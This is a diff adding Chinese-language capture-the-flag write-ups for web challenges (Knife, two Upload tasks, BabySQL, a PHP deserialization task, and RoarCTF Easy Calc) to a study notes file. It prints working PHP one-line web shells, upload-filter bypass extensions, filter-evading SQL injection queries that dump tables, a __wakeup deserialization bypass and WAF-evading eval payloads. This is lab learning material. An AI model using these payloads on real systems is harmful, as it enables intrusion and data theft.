@@ -1429,6 +1429,18 @@ Your password is '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zC
 
 ------
 
+### [极客大挑战 2019]Knife
+
+靶机的网页标题叫白给的shell。
+
+> 我家菜刀丢了，你能帮我找一下么
+>
+> eval($_POST["Syc"]);
+
+用[AntSword](https://github.com/AntSwordProject/antSword)连接靶机，在根目录下发现`flag`，提交`flag{c9e79be6-2a09-48ef-bd6a-a8b9c6e88967}`即可。
+
+------
+
 ### [极客大挑战 2019]Upload
 
 文件上传题。编写一句话木马，上传`.php`文件后显示**Not image!**
@@ -1442,7 +1454,7 @@ Your password is '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zC
 `.php`文件被拦截了，修改PHP后缀进行绕过，上传`.phtml	`文件后显示**NO! HACKER! your file included '<?'**
 
 ```
-phtml、pht、php、php3、php4、php5
+php3、php4、php5、php7、php8、phpt、phps、phtml
 ```
 
 发现`<?`被靶机检测出来了，修改一句话木马：
@@ -1460,6 +1472,291 @@ GIF89a?<script language="php">eval($_REQUEST[shell])</script>
 ```
 
 用[AntSword](https://github.com/AntSwordProject/antSword)连接`ip/upload/wdnmd.phtml`，在根目录下发现`flag`，提交`flag{5d49bb79-1b31-4bbc-a816-d1114e9b079a}`即可。
+
+------
+
+### [ACTF2020 新生赛]Upload
+
+文件上传题。编写一句话木马，选择`.php`文件上传，提示该文件不允许上传，请上传`jpg`、`png`、`gif`结尾的图片噢！
+
+```php
+GIF89a?<script language="php">eval($_REQUEST[shell])</script>
+```
+
+将后缀改为`.gif`上传，抓包修改文件后缀为`phtml`。
+
+```
+Upload Success! Look here~ ./uplo4d/ff66b3e97751db68e9248c93806c7119.phtml
+```
+
+用[AntSword](https://github.com/AntSwordProject/antSword)连接`ip/uplo4d/ff66b3e97751db68e9248c93806c7119.phtml`，提交`flag{12f15e79-affb-4be1-ad63-ed58341991bc}`。
+
+------
+
+### [极客大挑战 2019]BabySQL
+
+简单地尝试下：
+
+```
+1' or '1'='1 #     // NO,Wrong username password！！！
+
+1' or 1=1 #       // Error! You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1=1' and password='1'' at line 1
+```
+
+根据错误信息可知or被直接过滤删除了，尝试双写oorr，好家伙！
+
+```
+1' oorr 1=1 #    // Login Success!
+```
+
+用`union`查询测试注入点（回显点位）：
+
+```
+1' union select 1,2,3 # // You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1,2,3 #' and password='1'' at line 1
+
+1' ununionion seselectlect 1,2,3 # // Login Success!
+```
+
+得到回显点位为`2`和`3`。
+
+```
+/check.php?username=1' ununionion seselectlect 1,2,3%23&password=6
+
+Login Success!
+Hello 2！
+Your password is '3'
+```
+
+查询到当前数据库为`geek`。
+
+```
+/check.php?username=1' ununionion seselectlect 1,'Dad',database()%23&password=6
+
+Login Success!
+Hello Dad！
+Your password is 'geek'
+```
+
+爆出所有的数据库。
+
+```
+/check.php?username=1' ununionion seselectlect 1,'Dad',group_concat(schema_name)frfromom
+(infoorrmation_schema.schemata)%23&password=6
+
+Login Success!
+Hello Dad！
+Your password is 'information_schema,mysql,performance_schema,test,ctf,geek'
+```
+
+爆出`Flag`表中的字段。
+
+```
+/check.php?username=1' ununionion seselectlect 1,'Dad',group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name="Flag" %23&password=6
+
+Login Success!
+Hello Dad！
+Your password is 'flag'
+```
+
+爆出`flag`字段中的数据，得到`flag{76f8ba35-4123-46d5-8a3e-2b034065588f}`。
+
+```
+/check.php?username=1' ununionion seselectlect 1,'Dad',group_concat(flag)frfromom(ctf.Flag) %23&password=6
+
+Login Success!
+Hello Dad！
+Your password is 'flag{76f8ba35-4123-46d5-8a3e-2b034065588f}'
+```
+
+------
+
+### [极客大挑战 2019]PHP
+
+`dirsearch`扫描靶机目录发现有个名为`www.zip`的备份文件，解压缩后有五个文件，其中`.php`文件源码如下：
+
+```php
+# index.php
+...
+    <?php
+    include 'class.php';
+    $select = $_GET['select'];		# 获取参数值
+    $res=unserialize(@$select);		# 对参数反序列化，说明输入的参数是经过序列化之后的
+    ?>
+...
+
+# class.php
+<?php
+include 'flag.php';
+error_reporting(0);
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+    public function __construct($username,$password){		# 用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。
+        $this->username = $username;
+        $this->password = $password;
+    }
+    
+    function __wakeup(){
+        $this->username = 'guest';
+    }
+    
+    function __destruct(){		# 当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。
+        if ($this->password != 100) {		# 如果 password != 100 就输出用户名和密码
+            echo "</br>NO!!!hacker!!!</br>";
+            echo "You name is: ";
+            echo $this->username;echo "</br>";
+            echo "You password is: ";
+            echo $this->password;echo "</br>";
+            die();
+        }
+        if ($this->username === 'admin') {		# 当 username === admin 才能输出 flag
+            global $flag;
+            echo $flag;
+        }else{
+            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+            die();
+        }
+    }
+}
+?>
+
+# flag.php
+<?php
+$flag = 'Syc{dog_dog_dog_dog}';
+?>
+
+```
+
+经分析，已经确定需要提交的参数是`select`，而且提交的值是经过序列化之后的值，`username=‘admin’,password=‘100’` 才能通过。PHP序列化代码如下：
+
+```php
+<?php
+class Name{
+    private $username = 'admin';
+    private $password = '100';
+}
+
+$ser = serialize(new Name());
+var_dump($ser);        #  O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:"Namepassword";s:3:'100';}
+?>
+```
+
+直接提交不对。
+
+```
+NO!!!hacker!!!
+You name is: nonono
+You password is: yesyes
+```
+
+在类外部使用 `serialize()` 函数进行序列化的时候，会先调用类内部的 `__sleep()` 方法，同理在调用 `unserialize()` 函数的时候会先调用 `__wakeup()` 方法。在上面的 `class `中有一个 `__wakeup()` 方法，调用反序列化函数的时候会先调用了 `__wakeup()` 方法,但是这个方法有个缺陷，就是当参数的个数大于实际参数个数的时候就可以跳过执行 `__wakeup()` 方法。所以修改一下参数个数再提交。
+
+```
+?select=O:4:"Name":12:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
+```
+
+得到`flag{c761db1d-fbe0-48f5-bb04-4b14a779d847}`。
+
+------
+
+### [RoarCTF 2019]Easy Calc
+
+靶机提供了一个简单的计算器，经过测试，数字和算式都能被计算，但是字母和一些特殊字符不能被解析。查看网页源码，发现关键代码`calc.php?num="+encodeURIComponent($("#content").val())`。
+
+```python
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>简单的计算器</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="./libs/bootstrap.min.css">
+  <script src="./libs/jquery-3.3.1.min.js"></script>
+  <script src="./libs/bootstrap.min.js"></script>
+</head>
+<body>
+<div class="container text-center" style="margin-top:30px;">
+  <h2>表达式</h2>
+  <form id="calc">
+    <div class="form-group">
+      <input type="text" class="form-control" id="content" placeholder="输入计算式" data-com.agilebits.onepassword.user-edited="yes">
+    </div>
+    <div id="result"><div class="alert alert-success">
+            </div></div>
+    <button type="submit" class="btn btn-primary">计算</button>
+  </form>
+</div>
+<!--I've set up WAF to ensure security.-->
+<script>
+    $('#calc').submit(function(){
+        $.ajax({
+            url:"calc.php?num="+encodeURIComponent($("#content").val()),
+            type:'GET',
+            success:function(data){
+                $("#result").html(`<div class="alert alert-success">
+            <strong>答案:</strong>${data}
+            </div>`);
+            },
+            error:function(){
+                alert("这啥?算不来!");
+            }
+        })
+        return false;
+    })
+</script>
+</body>
+</html>
+```
+
+`calc.php?num="+encodeURIComponent($("#content").val())`中的`encodeURIComponent()`函数：
+
+- 不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。
+- 其他字符（比如 ：;/?&=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。
+
+查看`calc.php`，源码如下：
+
+```php+HTML
+<?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?>
+```
+
+PHP解析字符串的特性如下：
+
+> PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组`_POST`。
+> 例如`/?foo=bar`变成`Array([foo] => “bar”)`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。
+> 例如`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。
+> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
+> `/news.php?%20news[id%00=42"+AND+1=0 #`
+> 上述PHP语句的参数`%20news[id%00`的值将存储到`$_GET[“news_id”]`中。
+> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+> 1.删除空白符
+> 2.将某些字符转换为下划线（包括空格）
+
+使用`scandir()`函数返回指定目录中的文件和目录的数组。扫描靶机根目录是`scandir("/")`，但是`/`被过滤了。访问`/calc.php?%20num=scandir("/")`看到`what are you want to do?`。用`scandir(chr(47))`绕过，访问`/calc.php?%20num=scandir(chr(47))`得到`Array`。使用 `var_dump()` 枚举查看数组中的内容，访问`/calc.php?%20num=var_dump(scandir(chr(47)))`看到以下信息，发现`f1agg`！
+
+```php
+array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }
+```
+
+使用`file_get_contents()`函数将整个文件的内容读入到一个字符串中，`/f1agg`的`ASCII`值为`47, 102, 49, 97, 103, 103`，使用`chr()`得到相应的`ASCII`字符，并用`.`将字符拼接成字符串，`payload`就构造出来啦。
+
+```
+/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+```
+
+得到`flag{203e9d93-fcd6-4095-97bd-7c208b4571da}`。
 
 ------
 
@@ -1623,7 +1920,7 @@ PHP解析字符串的特性如下：
 
 使用`scandir()`函数返回指定目录中的文件和目录的数组。扫描靶机根目录是`scandir("/")`，但是`/`被过滤了。访问`/calc.php?%20num=scandir("/")`看到`what are you want to do?`。用`scandir(chr(47))`绕过，访问`/calc.php?%20num=scandir(chr(47))`得到`Array`。使用 `var_dump()` 枚举查看数组中的内容，访问`/calc.php?%20num=var_dump(scandir(chr(47)))`看到以下信息，发现`f1agg`！
 
-```
+```php
 array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }
 ```
 
